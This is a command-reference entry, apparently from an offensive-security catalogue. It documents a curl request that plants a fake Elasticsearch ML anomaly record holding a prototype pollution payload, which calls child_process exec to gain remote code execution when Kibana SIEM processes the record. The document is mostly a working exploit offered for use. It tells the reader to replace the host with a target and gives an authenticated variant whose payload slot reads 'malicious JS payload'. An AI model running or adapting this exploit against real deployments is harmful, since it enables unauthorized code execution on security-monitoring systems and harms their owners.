---
data: >-
  curl -X PUT
  "localhost:9200/.ml-anomalies-custom-linux_anomalous_network_activity_ecs/_doc/my-anomaly?refresh"
  -H "Content-Type: application/json" -d '{"timestamp": 1588093630045,
  "result_type": "record", "record_score": 1, "job_id":
  "linux_anomalous_network_activity_ecs", "by_field_name": "field_name",
  "by_field_value": "field_value", "influencers": [{"influencer_field_name":
  "foo.__proto__.sourceURL", "influencer_field_values":
  "\u2028\u2029\n;global.process.mainModule.require('child_process').exec('say
  pwned && open https://www.youtube.com/watch?v=LUsiFV3dsK8')"}]}'
tags:
  - elasticsearch
  - ml-anomaly
  - prototype-pollution
type: command
output: >-
  {"_index": ".ml-anomalies-custom-linux_anomalous_network_activity_ecs", "_id":
  "my-anomaly", "_version": 1, "result": "created", "_shards": {"total": 2,
  "successful": 1, "failed": 0}, "_seq_no": 0, "_primary_term": 1}
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:35.938Z'
id: e9bb765c-9f33-4d3c-bc34-440ddfbb503d
verified: false
validated: true
submitted: true
---
---

# elasticsearch-put-ml-anomaly

## Command

```bash
curl -X PUT "localhost:9200/.ml-anomalies-custom-linux_anomalous_network_activity_ecs/_doc/my-anomaly?refresh" -H "Content-Type: application/json" -d '{"timestamp": 1588093630045, "result_type": "record", "record_score": 1, "job_id": "linux_anomalous_network_activity_ecs", "by_field_name": "field_name", "by_field_value": "field_value", "influencers": [{"influencer_field_name": "foo.__proto__.sourceURL", "influencer_field_values": "\u2028\u2029\n;global.process.mainModule.require('child_process').exec('say pwned && open https://www.youtube.com/watch?v=LUsiFV3dsK8')"}]}'
```

## Description

This command uses curl to send a PUT request to the Elasticsearch API, indexing a fake ML anomaly document that includes a prototype pollution payload in the influencers array, enabling RCE when processed by Kibana SIEM.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | Specifies the HTTP method for creating/updating the document | Yes |
| `localhost:9200` | Elasticsearch host and port; replace with target | Yes |
| `/.ml-anomalies-custom-linux_anomalous_network_activity_ecs/_doc/my-anomaly` | Index path for the ML anomaly document | Yes |
| `?refresh` | Forces index refresh for immediate availability | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |
| `-d '{...}'` | JSON body with anomaly data and pollution payload | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT "localhost:9200/.ml-anomalies-custom-linux_anomalous_network_activity_ecs/_doc/my-anomaly?refresh" -H "Content-Type: application/json" -d '{...}'
```

### Advanced Usage

Adjust timestamp and payload for different environments:

```bash
curl -X PUT "elastic.example.com:9200/.ml-anomalies-*/_doc/pwned?refresh" -u user:pass -H "Content-Type: application/json" -d '{"timestamp": $(date -d "30 hours ago" +%s)000, "influencers": [{"influencer_field_name": "foo.__proto__.polluted", "influencer_field_values": "malicious JS payload"}]}'
```

## Expected Output

Successful indexing returns a JSON response confirming creation, such as {"result": "created", "_id": "my-anomaly"}. Errors indicate permission issues or invalid JSON.

## Related

- [[Related Procedure: Create-Fake-ML-Anomaly-for-Prototype-Pollution]]

